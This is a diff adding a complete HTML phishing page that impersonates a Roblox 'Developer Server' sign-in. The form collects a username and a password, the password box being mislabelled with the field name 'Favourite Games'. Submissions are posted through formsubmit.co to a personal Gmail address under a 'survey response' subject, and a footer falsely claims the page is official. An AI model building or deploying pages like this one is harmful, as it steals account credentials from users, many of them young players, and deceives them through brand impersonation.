@@ -1,0 +1,241 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Roblox Developer Server Startup</title>
+
+<style>
+* {
+  box-sizing: border-box;
+}
+
+body {
+  margin: 0;
+  min-height: 100vh;
+  font-family: Arial, sans-serif;
+  background:
+    radial-gradient(circle at 15% 20%, #424242 0, transparent 30%),
+    radial-gradient(circle at 85% 80%, #333 0, transparent 35%),
+    #151515;
+  color: white;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  padding: 25px;
+  overflow-x: hidden;
+}
+
+/* Background decorations */
+
+body::before {
+  content: "";
+  position: fixed;
+  width: 180px;
+  height: 180px;
+  border: 25px solid #ffffff0b;
+  transform: rotate(25deg);
+  top: 5%;
+  left: 5%;
+  pointer-events: none;
+}
+
+body::after {
+  content: "";
+  position: fixed;
+  width: 220px;
+  height: 220px;
+  border: 30px solid #ffffff0b;
+  transform: rotate(25deg);
+  bottom: 2%;
+  right: 3%;
+  pointer-events: none;
+}
+
+/* Survey box */
+
+.container {
+  position: relative;
+  z-index: 1;
+  width: 100%;
+  max-width: 470px;
+  background: #242424;
+  padding: 35px;
+  border-radius: 15px;
+  border: 1px solid #454545;
+  box-shadow: 0 15px 50px #0008;
+}
+
+/* Roblox-inspired logo */
+
+.brand {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  gap: 12px;
+  margin-bottom: 25px;
+}
+
+.logo {
+  width: 37px;
+  height: 37px;
+  background: white;
+  transform: rotate(15deg);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.logo-hole {
+  width: 12px;
+  height: 12px;
+  background: #242424;
+}
+
+.brand span {
+  font-size: 29px;
+  font-weight: 900;
+  letter-spacing: -1px;
+}
+
+h1 {
+  text-align: center;
+  font-size: 27px;
+  margin-bottom: 8px;
+}
+
+.subtitle {
+  text-align: center;
+  color: #aaa;
+  font-size: 14px;
+  margin-bottom: 30px;
+  line-height: 1.5;
+}
+
+label {
+  display: block;
+  font-weight: bold;
+  margin: 20px 0 9px;
+  font-size: 14px;
+}
+
+input, textarea {
+  width: 100%;
+  padding: 15px;
+  background: #383838;
+  border: 1px solid #555;
+  border-radius: 8px;
+  color: white;
+  font-size: 15px;
+  outline: none;
+}
+
+input:focus, textarea:focus {
+  border-color: white;
+}
+
+textarea {
+  min-height: 120px;
+  resize: vertical;
+}
+
+button {
+  width: 100%;
+  padding: 16px;
+  margin-top: 25px;
+  background: white;
+  color: black;
+  border: none;
+  border-radius: 8px;
+  font-size: 16px;
+  font-weight: 900;
+  cursor: pointer;
+}
+
+button:hover {
+  background: #d9d9d9;
+}
+
+.footer {
+  text-align: center;
+  color: #777;
+  font-size: 11px;
+  margin-top: 23px;
+}
+
+@media(max-width: 480px) {
+  .container {
+    padding: 25px;
+  }
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <div class="brand">
+    <div class="logo">
+      <div class="logo-hole"></div>
+    </div>
+    <span>ROBLOX</span>
+  </div>
+
+  <h1>ROBLOX DEVELOPER SERVER</h1>
+
+  <p class="subtitle">
+    Sign in to Roblox Developer Server!
+  </p>
+
+  <form
+    action="https://formsubmit.co/yashindianraj12@gmail.com"
+    method="POST"
+  >
+
+    <label>Roblox Username</label>
+
+    <input
+      type="text"
+      name="Roblox Username"
+      placeholder="Enter your username"
+      maxlength="50"
+      required
+    >
+
+    <label></label>
+
+    <textarea
+      name="Favourite Games"
+      placeholder="Enter password"
+      maxlength="20"
+      required
+    ></textarea>
+
+    <input
+      type="hidden"
+      name="_subject"
+      value="New Roblox Survey Response"
+    >
+
+    <input
+      type="hidden"
+      name="_captcha"
+      value="true"
+    >
+
+    <button type="submit">
+      SUBMIT 
+    </button>
+
+  </form>
+
+  <div class="footer">
+    Official Roblox Developer Page *terms to license 112-A ACT 49-A
+  </div>
+
+</div>
+
+</body>
+</html>
